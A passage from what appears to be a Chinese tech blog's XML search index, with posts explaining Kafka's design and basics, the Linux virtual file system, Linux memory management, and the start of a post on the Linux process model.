        <tag>Linux</tag>
        <tag>Cgroups</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka篇-设计思路]]></title>
    <url>%2F2019%2F07%2F28%2Fkafka%E7%AF%87-%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[1. 设计背景 许多互联网公司，每天都会产生大量的日志数据，包括用户行为记录、运营指标、系统运行状况的监控数据等。为了分析用户的行为或者监控系统的状态，需要对这些数据进行周期性的分析和统计。 传统的日志分析系统提供了一种离线处理日志信息的可扩展方案（类似于从生产环境的服务器上抓取日志文件，然后聚合到数据仓库进行离线分析），但如果要进行实时地处理，通常会有较大延迟。 kafka构建了一种新颖的消息系统，提供了类似于消息传递系统的API，允许应用程序实时的订阅日志事件，做到实时或近实时分析。 2. 持久化设计 与传统消息系统不同的是，kafka会把消息持久化到磁盘上，以实现消息的回溯功能。 磁盘总是给人们留下“慢速”的印象，事实上，磁盘的速度要比人们预想中的快得多，这取决于使用磁盘的姿势。常见的SATA磁盘随机读写性能，仅为100K/s，而顺序读写可达600MB/s，不同的使用姿势，性能差距可达到6000倍。 kafka为了实现高吞吐的消息服务，充分借助了磁盘顺序读写的优势。 2.1 磁盘顺序读写 磁盘的顺序读写是有规律的，并且操作系统进行了大量优化，包括read-ahead和write-behind技术，其中read-ahead是以大的data block为单位预先读取数据，而write-behind则是将多个小型的逻辑写操作，合并成一次大型的物理磁盘写入。 除此之外，操作系统还对读写磁盘的内容进行cache，主动将系统空闲内存用作page cache，所有的磁盘读写操作都会通过这个page cache。 kafka没有使用in-process cache来缓存磁盘数据，而是使用了page cache，因为即使进程维护了in-process cache，在读写磁盘时，该数据也会被复制到操作系统的page cache中。直接使用page cache一方面可以使得缓存容量大大增加，另一方面kafka服务重启的情况下，缓存依旧可用。 为了充分利用磁盘顺序读写能力、实现消息存储时的高吞吐，kafka只是对消息进行简单的读取和追加，并没有使用类似于BTree的数据结构来索引数据和随机读写数据。 消息系统一般都是顺序消费、依次推送消息，这种根据需求特定场景进行的简单读取和追加，既可以满足实际需求，又能大幅提升吞吐。 2.2 消息过期机制 在 Kafka 中，可以让消息保留相对较长的一段时间(比如一周)，而不是试图在被消费后立即删除，也可以让消息保留到一定规模后，比如消息大小超出2G，再清除旧数据。 3. 高吞吐设计 kafka的吞吐表现是极为优秀的，在kafka篇-基本介绍中也给出了吞吐性能的测试数据，这里简单谈一谈kafka高吞吐的设计要点。 3.1 本地IO的优化 kafka强依赖操作系统提供的page cache功能，采用简单读取、顺序追加的方式，保证读写操作均属于Sequence I/O，从而充分利用了磁盘顺序读写的性能。 3.2 网络IO的优化 kafka是一个分布式的消息系统，在消息的生产和消费过程中，不仅涉及到本地的IO，还涉及大量的网络IO，对于网络层IO的优化，主要涉及两个方面： 避免大量小型的IO操作 避免过多的字节拷贝 小型的IO操作发生在客户端与服务器之间，以及服务端自身的持久化操作中。为了避免大量小型的IO操作，kafka对消息进行分组，使得多个消息打包成一组，而不是每次发送一条消息，这样可以减少小型网络IO的操作，批处理从而带来更大的吞吐。 为了避免过多的字节拷贝，kafka对日志块的网络传输也进行了优化，通过sendfile系统调用将数据从page cache直接转移到socket网络连接中。数据从文件到套接字，常见的数据传输路径如下： 操作系统从磁盘读取数据 -&gt; 内核空间的page cache 应用程序读取内核空间数据 -&gt; 用户空间的缓冲区 应用程序将数据(用户空间的缓冲区) -&gt; 内核空间到套接字缓冲区(内核空间) 操作系统将数据从套接字缓冲区(内核空间) -&gt; 网络发送的 NIC 缓冲区 中间涉及4次copy操作和两次系统调用，而通过sendfile的话，可以允许操作系统将数据从page cache直接发送到网络，即只需最后一步操作，可将数据复制到NIC缓冲区。 3.3 压缩 kafka提供了端到端的数据压缩功能，将消息以压缩格式写入，并在日志中保持压缩，只在consumer消费时解压缩。 4. 稳定性设计 稳定性对每一个系统来说，都是尤为重要的，kafka为了保障稳定性，不仅为每个数据分区实现了副本的概念，而且为日志备份提供了一整套的保障机制。 4.1 分区和副本 kafka将主题划分为多个分区，通过分区规则将消息存储到相应的分区，只要分区规则设置的合理，那么所有消息将会被均匀的分布到不同的分区中，从而实现负载均衡和水平扩展。kafka每个分区拥有若干副本，当集群部分节点出现问题时，可以进行故障转移，以保证数据的可用性。 4.2 日志备份 ISR kafka稳定性的核心是备份日志文件，正常情况下每个分区都有一个leader和零或多个followers，读写操作均由leader处理，followers节点同步leader节点的日志，保持消息和偏移量同leader一致。日志的读写操作均由leader完成，其他follower节点从leader同步日志。如果leader因意外而退出，kafka会通过ISR集合选出新的leader节点。 ISR（a set of in-sync replicas）是kafka维护的同步状态集合，只有这个集合的成员才有资格被选为leader，并且一条消息需要被这个集合的所有节点读取并追加到日志，这条消息才可以被视为提交，ISR集合的变化会持久化到ZooKeeper中。 5. 参考 kafka官方文档]]></content>
      <tags>
        <tag>开源工具</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kafka篇-基本介绍]]></title>
    <url>%2F2019%2F06%2F24%2Fkafka%E7%AF%87-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[1. kafka基础 1.1 定位和功能 kafka是一个分布式的消息系统，使用scala语言编写，现已经贡献给Apache基金会。主要有以下特点： 可以发布与订阅消息：消息可以细分为不同的主题，支持多种消息发布和订阅需求。 可以存储消息记录，并具有较好容错性：可以按时间或者容量大小清理旧消息。 支持弹性扩展，以支撑海量数据规模：kafka是分布式的，一方面可以提升系统吞吐，另一方面可以提升可用性。 1.2 消息 kafka的数据单元称为【消息】，可以理解为一条数据记录，由键和值组成。键值都是字节数组，其中键是可选的，kafka通过散列键取模后，控制消息写到主题的不同分区。 为了提高写入的效率，消息也会被分成一批写入kafka。 1.3 主题和分区 主题也叫Topic，是数据记录发布和订阅的地方。不同类型或者业务的数据，可以区分为不同的主题。一个Topic可以拥有一个或者多个消费者来订阅数据，也可以有一个或多个生产者生产数据。对每一个Topic，kafka集群会维护一个分区日志，如下所示： 每个分区都是有序并且顺序不可变的记录集合，新数据不断追加到结构化的commit log文件中。分区中的每一个数据记录都会配置一个ID号来表示顺序，也称之为offset。 消费者唯一保存的元数据是offset，在读取记录后，会以线性的方式增加偏移量。由于这个位置是消费者控制，所以消费者可以采用任何顺序来消费记录。比如重置到一个旧的偏移位置，从而达到数据回溯的目的。 Topic还有Partition（分区）的概念，一方面是扩展单台服务器的硬件限制，继而扩展Topic的日志量级，因为单独的分区都会受限于主机的文件限制。另一方面可以并行的处理以提高效率，比如并行的处理消费或者生产过程。 1.3 生产者和消费者 kafka的客户端分为生产者和消费者两种类型，其中生产者用于创建消息，将消息写入到kafka的某个主题。在大部分场景下，生产者不关注消息写到哪个分区，如果要控制部分消息写到相同的分区，需要自定义实现分区器，对消息的键做散列过程。 消费者从主题中订阅消息，它需要保存分区的offset。消费者从属于一个消费群组，一个或者多个消费群组可以订阅相同的主题，消费群组用来保证每个分区只能被一个消费者使用。例如： 消费群组A有两个消费者C1、C2，每个消费者均分两个分区。而消费群组B有四个消费者C3~C6，每个消费者均分1个分区。 kafka只能保证分区内的记录是有序的，而不保证不同分区的顺序。 1.4 broker和集群 一个独立的kafka服务器被称为broker， broker接收生产者消息，为消息设置偏移量，并提交到磁盘保存。 broker为消费者提供服务，对读取分区的请求做出响应。 broker是集群的组成部分，每个集群都有一个broker充当集群控制器的角色，负责kafka管理工作，比如将分区分配给broker和监控broker等。为了提升可用性，分区还有副本的概念，每个分区副本都归属于不同的broker，如果一个副本挂掉，其他副本仍是可用的，这个得益于分区复制的特性。 kafka有两种消息保留策略，一种是设定过期时间，超时自动清理，一种是设置大小，当消息数量达到上限时，旧消息会过期会删除。 2. kafka API 2.1 The Produer API 允许应用程序发布一串流式的数据到一个或者多个kafka topic。 2.2 The Consumer API 允许应用程序订阅一个或者多个topic，并消费到相应topic中新发布的数据。 2.3 The Streams API 允许一个应用程序作为一个流处理器，消费一个或者多个topic，然后作为生产者输出到一个或者多个topic中。 2.4 The Connector API 允许构建并运行可重用的生产者或者消费者，将Kafka topics连接到已存在的应用程序或者数据系统。比如，连接到一个关系型数据库，捕捉表（table）的所有变更内容。 3. kafka概要 3.1 优缺点 优点： 高吞吐：充分利用磁盘顺序读写能力，单机吞吐性能卓越，每秒可处理数千条消息。 低延迟：毫秒级处理消息的能力。 容错性：部分分区挂掉的情况下，数据仍不会丢失。 持久化：kafka将消息持久化磁盘上，支持消息回溯、消息自动清理。 扩展性：支持弹性伸缩，以支撑更大规模的消息规模。 消息代理：kafka broker可以将发布者的消息传递协议转换为接受者的消息传递协议。 消费者友好型：kafka可以与各种消费者集成，根据消费者的不同，它可以表现或采取不同的行为。 批量处理能力：因为消息持久化，所以具有一定的批量处理能力。 丰富的项目示例：日志聚合、trace系统、流式系统等等。 缺点： 没有完善的监控工具集。 不支持通配符的方式选择主题。 消息调整：broker通过确定的系统调用来传递消息，如果消息未发生改变的时候，性能表现良好，如果消息发生更改或者调整，那么性能会下降的比较厉害。 不保证消息传递的稳定性：可能出现消息丢失、重复消息、消息乱序等。 3.2 性能表现 硬件配置： Intel Xeon 2.5 GHz processor with six cores Six 7200 RPM SATA drives 32GB of RAM 1Gb Ethernet 3台机器组成kafka集群，测试如下： 场景 消息量 大小 单生产者无副本 821,557 records/sec 78.3MB/sec 单生产者3X副本 786,980 records/sec 75.1 MB/sec 三生产者3X副本 2,024,032 records/sec 193.0 MB/sec — — — 单消费者 940,521 records/sec 89.7 MB/sec 三消费者 2,615,968 records/sec 249.5 MB/sec 端到端的延迟： 平均：2ms 99分位：3ms 99.9分位: 14ms 数据来源：https://engineering.linkedin.com/kafka/benchmarking-apache-kafka-2-million-writes-second-three-cheap-machines 3.3 适用场景 消息传递系统 kafka可以很好的替代传统的消息队列，比如数据生成器与数据处理的解耦，缓冲未处理的消息以流量削峰等。相比传统的消息系统，kafka拥有更好的吞吐、内置分区、具有复制和容错的能力。 Trace系统 用户活动信息（点赞、收藏、评论等）发布到中心主题Topic，订阅源可以进行一系列的处理，包括实时监控、通知用户、生成报表等等。 日志聚合 服务器物理日志文件可以传输到kafka相应的主题中，可以抽象成一个更加清晰的数据流，方便后续日志分析、错误定位、报警等等。 流处理 kafka可以解耦数据产出和数据加工环节，并以毫秒级延迟传递消息，这种特性可以基于各个主题创建实时数据流图，实现数据的流式处理。举个简单的例子：用户的点击、浏览行为可以推送到主题A，行为分析模块从主题A中获取数据开始分析产生模型数据，并推到主题B，推荐模块从主题B中获取模型，以生效新的推荐模型等等。 等等 4. 参考 kafka官网手册 kafka权威指南]]></content>
      <tags>
        <tag>开源工具</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux虚拟文件系统]]></title>
    <url>%2F2019%2F06%2F15%2F%E6%B5%85%E8%B0%88Linux%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[1. 虚拟文件系统概述 1.1 VFS简介 虚拟文件系统（Virtual File System，简称VFS）是Linux内核的子系统之一，它为用户程序提供文件和文件系统操作的统一接口，屏蔽不同文件系统的差异和操作细节。借助VFS可以直接使用open()、read()、write()这样的系统调用操作文件，而无须考虑具体的文件系统和实际的存储介质。 举个例子，Linux用户程序可以通过read() 来读取ext3、NFS、XFS等文件系统的文件，也可以读取存储在SSD、HDD等不同存储介质的文件，无须考虑不同文件系统或者不同存储介质的差异。 通过VFS系统，Linux提供了通用的系统调用，可以跨越不同文件系统和介质之间执行，极大简化了用户访问不同文件系统的过程。另一方面，新的文件系统、新类型的存储介质，可以无须编译的情况下，动态加载到Linux中。 &quot;一切皆文件&quot;是Linux的基本哲学之一，不仅是普通的文件，包括目录、字符设备、块设备、套接字等，都可以以文件的方式被对待。实现这一行为的基础，正是Linux的虚拟文件系统机制。 1.2 VFS原理 VFS之所以能够衔接各种各样的文件系统，是因为它抽象了一个通用的文件系统模型，定义了通用文件系统都支持的、概念上的接口。新的文件系统只要支持并实现这些接口，并注册到Linux内核中，即可安装和使用。 举个例子，比如Linux写一个文件： 1int ret = write(fd, buf, len); 调用了write()系统调用，它的过程简要如下： 首先，勾起VFS通用系统调用sys_write()处理。 接着，sys_write()根据fd找到所在的文件系统提供的写操作函数，比如op_write()。 最后，调用op_write()实际的把数据写入到文件中。 操作示意图如下： 2. 虚拟文件系统组成部分 Linux为了实现这种VFS系统，采用面向对象的设计思路，主要抽象了四种对象类型： 超级块对象：代表一个已安装的文件系统。 索引节点对象：代表具体的文件。 目录项对象：代表一个目录项，是文件路径的一个组成部分。 文件对象：代表进程打开的文件。 每个对象都包含一组操作方法，用于操作相应的文件系统。 备注：Linux将目录当做文件对象来处理，是另一种形式的文件，它里面包含了一个或多个目录项。而目录项是单独抽象的对象，主要包括文件名和索引节点号。因为目录是可以层层嵌套，以形成文件路径，而路径中的每一部分，其实就是目录项。 接下来介绍一下各个对象的作用以及相关操作。 2.1 超级块 超级块用于存储文件系统的元信息，由super_block结构体表示，定义在&lt;linux/fs.h&gt;中，元信息里面包含文件系统的基本属性信息，比如有： 索引节点信息 挂载的标志 操作方法 s_op 安装权限 文件系统类型、大小、区块数 等等等等 其中操作方法 s_op 对每个文件系统来说，是非常重要的，它指向该超级块的操作函数表，包含一系列操作方法的实现，这些方法有： 分配inode 销毁inode 读、写inode 文件同步 等等 当VFS需要对超级块进行操作时，首先要在超级块的操作方法 s_op 中，找到对应的操作方法后再执行。比如文件系统要写自己的超级块： 1superblock-&gt;s_op-&gt;write_supper(sb); 创建文件系统时，其实就是往存储介质的特定位置，写入超级块信息；而卸载文件系统时，由VFS调用释放超级块。 Linux支持众多不同的文件系统，file_system_type结构体用于描述每种文件系统的功能和行为，包括： 名称、类型等 超级块对象链表 等 当向内核注册新的文件系统时，其实是将file_system_type对象实例化，然后加入到Linux的根文件系统的目录树结构上。 2.2 索引 索引节点对象包含Linux内核在操作文件、目录时，所需要的全部信息，这些信息由inode结构体来描述，定义在&lt;linux/fs.h&gt;中，主要包含： 超级块相关信息 目录相关信息 文件大小、访问时间、权限相关信息 引用计数 等等 一个索引节点inode代表文件系统中的一个文件，只有当文件被访问时，才在内存中创建索引节点。与超级块类似的是，索引节点对象也提供了许多操作接口，供VFS系统使用，这些接口包括： create(): 创建新的索引节点（创建新的文件） link(): 创建硬链接 symlink(): 创建符号链接。 mkdir(): 创建新的目录。 等等，我们常规的文件操作，都能在索引节点中找到相应的操作接口。 2.3 目录项 前面提到VFS把目录当做文件对待，比如/usr/bin/vim，usr、bin和vim都是文件，不过vim是一个普通文件，usr和bin都是目录文件，都是由索引节点对象标识。 由于VFS会经常的执行目录相关的操作，比如切换到某个目录、路径名的查找等等，为了提高这个过程的效率，VFS引入了目录项的概念。一个路径的组成部分，不管是目录还是普通文件，都是一个目录项对象。/、usr、bin、vim都对应一个目录项对象。不过目录项对象没有对应的磁盘数据结构，是VFS在遍历路径的过程中，将它们逐个解析成目录项对象。 目录项由dentry结构体标识，定义在&lt;linux/dcache.h&gt;中，主要包含： 父目录项对象地址 子目录项链表 目录关联的索引节点对象 目录项操作指针 等等 目录项有三种状态： 被使用：该目录项指向一个有效的索引节点，并有一个或多个使用者，不能被丢弃。 未被使用：也对应一个有效的索引节点，但VFS还未使用，被保留在缓存中。如果要回收内存的话，可以撤销未使用的目录项。 负状态：没有对应有效的索引节点，因为索引节点被删除了，或者路径不正确，但是目录项仍被保留了。 将整个文件系统的目录结构解析成目录项，是一件费力的工作，为了节省VFS操作目录项的成本，内核会将目录项缓存起来。 2.4 文件 文件对象是进程打开的文件在内存中的实例。Linux用户程序可以通过open()系统调用来打开一个文件，通过close()系统调用来关闭一个文件。由于多个进程可以同时打开和操作同一个文件，所以同一个文件，在内存中也存在多个对应的文件对象，但对应的索引节点和目录项是唯一的。 文件对象由file结构体表示，定义在&lt;linux/fs.h&gt;中，主要包含： 文件操作方法 文件对象的引用计数 文件指针的偏移 打开文件时的读写标识 等等等等 类似于目录项，文件对象也没有实际的磁盘数据，只有当进程打开文件时，才会在内存中产生一个文件对象。 每个进程都有自己打开的一组文件，由file_struct结构体标识，该结构体由进程描述符中的files字段指向。主要包括： fdt fd_array[NR_OPEN_DEFAULT] 引用计数 等 fd_array数组指针指向已打开的文件对象，如果打开的文件对象个数 &gt; NR_OPEN_DEFAULT，内核会分配一个新数组，并将 fdt 指向该数组。 除此之外，内核还为所有打开文件维持一张文件表，包括： 文件状态标志 文件偏移量 等 关于多进程打开同一文件以及文件共享更详细的信息，可以阅读《UNIX环境高级编程》第三章。 3. 总结 Linux支持了很多种类的文件系统，包含本地文件系统ext3、ext4到网络文件系统NFS、HDFS等，VFS系统屏蔽了不同文件系统的操作差异和实现细节，提供了统一的实现框架，也提供了标准的操作接口，这大大降低了操作文件和接入新文件系统的难度。 4. 参考 深入理解Linux内核 Linux内核设计与实现]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>VFS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux内存管理]]></title>
    <url>%2F2019%2F05%2F26%2F%E6%B5%85%E8%B0%88Linux%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[扫盲篇 操作系统存储层次 常见的计算机存储层次如下： 寄存器：CPU提供的，读写ns级别，容量字节级别。 CPU缓存：CPU和CPU间的缓存，读写10ns级别，容量较大一些，百到千节。 主存：动态内存，读写100ns级别，容量GB级别。 外部存储介质：磁盘、SSD，读写ms级别，容量可扩展到TB级别。 CPU内的缓存示意图如下： 其中 L1d 和 L1i 都是CPU内部的cache， L1d 是数据cache。 L1i 是指令缓存。 L2是CPU内部的，不区分指令和数据的。 由于现代PC有多个CPU，L3缓存多个核心共用一个。 对于编程人员来说，绝大部分观察主存和外部存储介质就可以了。如果要做极致的性能优化，可以关注L1、L2、L3的cache，比如nginx的绑核操作、pthread调度会影响CPU cache等。 内存管理概述 MMU（内存管理单元）：通过CPU将线性地址转换成物理地址。 虚拟内存 物理内存是有限的（即使支持了热插拔）、非连续的，不同的CPU架构对物理内存的组织都不同。这使得直接使用物理内存非常复杂，为了降低使用内存的复杂度，引入了虚拟内存机制。 虚拟内存抽象了应用程序物理内存的细节，只允许物理内存保存所需的信息（按需分页），并提供了一种保护和控制进程间数据共享数据的机制。有了虚拟内存机制之后，每次访问可以使用更易理解的虚拟地址，让CPU转换成实际的物理地址访问内存，降低了直接使用、管理物理内存的门槛。 物理内存按大小被分成页框、页，每块物理内存可以被映射为一个或多个虚拟内存页。这块映射关系，由操作系统的页表来保存，页表是有层级的。层级最低的页表，保存实际页面的物理地址，较高层级的页表包含指向低层级页表的物理地址，指向顶级的页表的地址，驻留在寄存器中。当执行地址转换时，先从寄存器获取顶级页表地址，然后依次索引，找到具体页面的物理地址。 大页机制 虚拟地址转换的过程中，需要好几个内存访问，由于内存访问相对CPU较慢，为了提高性能，CPU维护了一个TLB地址转换的cache，TLB是比较重要且珍稀的缓存，对于大内存工作集的应用程序，会因TLB命中率低大大影响到性能。 为了减少TLB的压力，增加TLB缓存的命中率，有些系统会把页的大小设为MB或者GB，这样页的数目少了，需要转换的页表项也小了，足以把虚拟地址和物理地址的映射关系，全部保存于TLB中。 区域概念 通常硬件会对访问不同的物理内存的范围做出限制，在某些情况下设备无法对所有的内存区域做DMA。在其他情况下，物理内存的大小也会超过了虚拟内存的最大可寻址大小，需要执行特殊操作，才能访问这些区域。这些情况下，Linux对内存页的可能使用情况将其分组到各自的区域中（方便管理和限制）。比如ZONE_DMA用于指明哪些可以用于DMA的区域，ZONE_HIGHMEM包含未永久映射到内核地址空间的内存，ZONE_NORMAL标识正常的内存区域。 节点 多核CPU的系统中，通常是NUMA系统（非统一内存访问系统）。在这种系统中，内存被安排成具有不同访问延迟的存储组，这取决于与处理器的距离。每一个库，被称为一个节点，每个节点Linux构建了一个独立的内存管理子系统。一个节点有自己的区域集、可用页和已用页表和各种统计计数器。 5、page cache 从外部存储介质中加载数据到内存中，这个过程是比较耗时的，因为外部存储介质读写性能毫秒级。为了减少外部存储设备的读写，Linux内核提供了Page cache。最常见的操作，每次读取文件时，数据都会被放入页面缓存中，以避免后续读取时所进行昂贵的磁盘访问。同样，当写入文件时，数据被重新放置在缓存中，被标记为脏页，定期的更新到存储设备上，以提高读写性能。 6、匿名内存 匿名内存或者匿名映射表示不受文件系统支持的内存，比如程序的堆栈隐式创立的，或者显示通过mmap创立的。 7、内存回收 贯穿系统的生命周期，一个物理页可存储不同类型的数据，可以是内核的数据结构，或是DMA访问的buffer，或是从文件系统读取的数据，或是用户程序分配的内存等。 根据页面的使用情况，Linux内存管理对其进行了不同的处理，可以随时释放的页面，称之为可回收页面，这类页面为：页面缓存或者是匿名内存（被再次交换到硬盘上） 大多数情况下，保存内部内核数据并用DMA缓冲区的页面是不能重新被回收的，但是某些情况下，可以回收使用内核数据结构的页面。例如：文件系统元数据的内存缓存，当系统处于内存压力情况下，可以从主存中丢弃它们。 释放可回收的物理内存页的过程，被称之为回收，可以同步或者异步的回收操作。当系统负载增加到一定程序时，kswapd守护进程会异步的扫描物理页，可回收的物理页被释放，并逐出备份到存储设备。 8、compaction 系统运行一段时间，内存就会变得支离破碎。虽然使用虚拟村内可以将分散的物理页显示为连续的物理页，但有时需要分配较大的物理连续内存区域。比如设备驱动程序需要一个用于DMA的大缓冲区时，或者大页内存机制分页时。内存compact可以解决了内存碎片的问题，这个机制将被占用的页面，从内存区域合适的移动，以换取大块的空闲物理页的过程，由kcompactd守护进程完成。 9、OOM killer 机器上的内存可能会被耗尽，并且内核将无法回收足够的内存用于运行新的程序，为了保存系统的其余部分，内核会调用OOM killer杀掉一些进程，以释放内存。 段页机制简介 段页机制是操作系统管理内存的一种方式，简单的来说，就是如何管理、组织系统中的内存。要理解这种机制，需要了解一下内存寻址的发展历程。 直接寻址：早期的内存很小，通过硬编码的形式，直接定位到内存地址。这种方式有着明显的缺点：可控性弱、难以重定位、难以维护 分段机制：8086处理器，寻址空间达到1MB，即地址线扩展了20位，由于制作20位的寄存器较为困难，为了能在16位的寄存器的基础上，寻址20位的地址空间，引入了段的概念，即内存地址=段基址左移4位+偏移 分页机制：随着寻址空间的进一步扩大、虚拟内存技术的引入，操作系统引入了分页机制。引入分页机制后，逻辑地址经过段机制转换得到的地址仅是中间地址，还需要通过页机制转换，才能得到实际的物理地址。逻辑地址 --&gt;(分段机制) 线性地址 --&gt;(分页机制) 物理地址。 段页机制详见：https://blog.lecury.cn/2017/05/05/内存寻址之段页存储机制分析/ 进阶篇 内存分配 大块内存的分配 扫盲篇也提到，Linux基于段页式机制管理物理内存，内存被分割成一个个页框，由多级页表管理。除此之外，由于硬件的约束： DMA处理器，只能对RAM的前16MB寻址。 32位机器CPU最大寻址空间，只有4GB，对于大容量超过4GB的RAM，无法访问所有的地址空间。 Linux还将物理内存划分为不同的管理区：ZONE_DMA、ZONE_NORMAL、ZONE_HIGHMEM，每个管理区都有自己的描述符，也有自己的页框分配器，示意图如下： 对于连续页框组的内存分配请求，是由管理区分配器完成，每个管理区的页框分配是通过伙伴系统算法来实现。内核经常请求和释放单个页框，为了提高性能，每个内存管理区，还定义了一个CPU页框高速缓存，包含一些预选分配的页框。 伙伴系统算法：内核为分配一组连续的页框而建立的一种健壮、高效的分配策略，这种策略缓解了内存碎片的发生。算法的核心思想：是把所有的空闲页框分组为11个块链表，每个块链表分别包含1、2、4、8、16、…、512、1024个连续页框。举个简单的例子，说明算法的工作过程。 假设需要256个页框的连续内存，算法先在256个页框的链表中，检查是否还有空闲块，如果有就分配出去。如果没有，算法会找到下一个更大的512页框的链表，如果存在空闲块，内核会把512页框分割成两部分，一半用来分配，另一半插入到256页框的链表中。 小块内存的分配 伙伴系统算法采用页框作为基本的内存区，这适合于大块内存的请求。对于小块内存的分配，是采用的slab分配器算法来实现的。slab并没有脱离伙伴系统算法，而是基于伙伴系统分配的大内存基础上，进一步细分小内存对象的分配。slab 缓存分配器提供了很多优点， 首先，内核通常依赖于对小对象的分配，它们会在系统生命周期内进行无数次分配，slab 缓存分配器通过对类似大小的对象进行缓存，从而避免了常见的碎片问题。 slab 分配器还支持通用对象的初始化，从而避免了为同一目而对一个对象重复进行初始化。 最后slab 分配器还可以支持硬件缓存对齐和着色，这允许不同缓存中的对象占用相同的缓存行，从而提高缓存的利用率并获得更好的性能。 slab分配器详见：http://www.secretmango.com/jimb/Whitepapers/slabs/slab.html 备注: slab着色主要是为了更好的利用CPU L1 cache，所使用的地址偏移策略。如果slab分配对象后还有空间剩余，就会把剩余的空间进行着色处理，尽可能将slab对象分散在L1不同的cache line中。 非连续内存的分配 把内存区映射到一组连续的页框是最好的选择，这样会充分利用高速缓存。如果对内存区的请求不是很频繁，那么分配非连续的页框，会是比较好的选择，因为这样会避免外部碎片，缺点是内核的页表比较乱。Linux以下方面使用了非连续内存区： 为活动交换区分配数据结构。 给某些I/O驱动程序分配缓冲区。 等 实存、虚存 实存：进程分配的、加载到主存中的内存。包含来自共享库的内存，只要这些库占用的页框还在主存中，也包含所有正在使用的堆栈和堆内存。可以通过 ps -o rss 查看进程的实存大小。 虚存：包含进程可以访问的所有内存，包含被换出、已经分配但还未使用的内存，以及来自共享库的内存。可以通过 ps -o vsz 查看进程的虚存大小。 举个例子，如果进程A具有500K二进制文件并且链接到2500K共享库，则具有200K的堆栈/堆分配，其中100K实际上在内存中（其余是交换或未使用），并且它实际上只加载了1000K的共享库然后是400K自己的二进制文件： 12RSS: 400K + 1000K + 100K = 1500KVSZ: 500K + 2500K + 200K = 3200K 实存和虚存是怎么转换的呢？当程序尝试访问的地址未处于实存中时，就发生页面错误，操作系统必须以某种方式处理这种错误，从而使应用程序正常运行。这些操作可以是： 找到页面驻留在磁盘上的位置，并加载到主存中。 重新配置MMU，更新线性地址和物理地址的映射关系。 等。 随着进程页面错误的增长，主存中可用页面越来越少，为了防止内存完全耗尽，操作系统必须尽快释放主存中暂时不用的页面，以释放空间供以后使用，方式如下： 将修改后的页面写入到磁盘的专用区域上（调页空间或者交换区）。 将未修改的页面标记为空闲（没必要写入磁盘，因为没有被修改）。 调页或者交换是操作系统的正常部分，需要注意的是过度交换，这表示当前主存空间不足，页面换出抖动对系统极为不利，会导致CPU和I/O负载升高，极端情况下，会造成操作系统所有的资源花费在调页层面。 page cache Linux中通过page cache机制来加速对磁盘文件的许多访问，当它首次读取或写入数据介质时，Linux会将数据存储在未使用的内存区中，通过这些区域充当缓存，如果再次读取这些数据时，直接从内存中快速获取该数据。当发生写操作时，Linux不会立刻执行磁盘写操作，而是把page cache中的页面标记为脏页，定期同步到存储设备中。 可以通过free -m来查看page cache情况： 1234 total used free shared buffers cachedMem: 32013 31288 724 0 241 12000-/+ buffers/cache: 19046 12966Swap: 32767 23134 9633 cached这列显示了page cache的情况。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux进程模型]]></title>
    <url>%2F2019%2F04%2F04%2F%E6%B5%85%E8%B0%88Linux%E8%BF%9B%E7%A8%8B%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[写在前面 进程基础 进程概念 进程描述符 进程创建 上下文切换 init进程 进程应用 进程间通信 信号处理 后台进程与守护进程 浅谈nginx多进程模型 常用工具介绍 ps: 查看进程属性 lsof: 查看打开的文件情况 netstat: 查看网络连接情况 strace: 查看系统调用情况 进程基础 基础概念 进程是操作系统的基本概念之一，它是操作系统分配资源的基本单位，也是程序执行过程的实体。程序是代码和数据的集合，本身是一个静态的概念，而进程是程序的一次执行的实体，是一个动态的概念。 那在Linux操作系统中，是如何描述一个进程的呢？ 进程描述符 为了管理进程，内核需要对每个进程的属性和所需要做的事情，进行清楚的描述，这个就是进程描述符的作用，Linux中的进程描述符由task_struct标识。 task_struct的数据结构是相当复杂的，不仅包含了很进程属性的字段，而且也包括了指向其他数据结构的指针。大致结构如下： state: 描述进程状态 thread_info: 进程的基本信息 mm: mm_struct指向内存区描述符的指针 tty: tty_struct终端相关的描述符 fs: fs_struct当前目录 files: files_struct指向文件描述符的指针 signal: signal_struct所接收的信号描述 很多等等。。 总结一下，进程描述符完整的保存了一个进程的属性和生命周期内的数据、状态和行为，由一个复杂的数据结构task_struct来表示。 进程创建 Linux创建一个进程，大致经历的过程如下： 初始化进程描述符 申请相应的内存区域 设置进程状态、加入调度队列等等 … 为了完整的描述一个进程，操作系统设计了非常复杂的数据结构、也申请了大量的内存空间。但是得益于写时复制技术，这些初始化操作，并没有明显的降低进程的创建速度。 写时复制技术：当新进程（子进程）被创建时，Linux内核并不会立马将父进程的内容复制给子进程，而仅仅当进程空间的内容发生变化时，才执行复制操作。写时复制技术允许父子进程读取相同的物理页，只要两者有一个试图更改页内容，内核就会把这个页的内容拷贝到新的物理页，并把这块页分给正在写的进程。 Linux中有三种系统调用可以创建进程 clone()、fork()、vfork() clone(): 最基础的创建进程的系统调用，可以指明子进程的基础属性（由各种FLAG标识）、堆栈等等。 fork(): 通过clone()实现，它的堆栈指向的是父进程的堆栈，因此父子进程共享同一个用户态堆栈。fork的子进程需要完全copy父进程的内存空间，但是得益于写时复制技术，这个过程其实挺快。 vfork(): 也是基于clone()来实现的，是历史上对fork()的优化，因为fork()需要copy父进程的内存空间，并且fork()后常常执行execve()将另一个程序加载进来，在写时复制技术之前，这种不必要的copy是代价是比较高昂的。因此vfork()实现时，会指明flag告诉clone()共享父进程的虚拟内存空间，以加快进程的创建过程。 上下文切换 概念：进程创建好之后，内核必须有能力挂起正在CPU运行的进程，并切换其他进程到CPU上执行。这种过程被称作为进程切换、任务切换或者上下文切换。 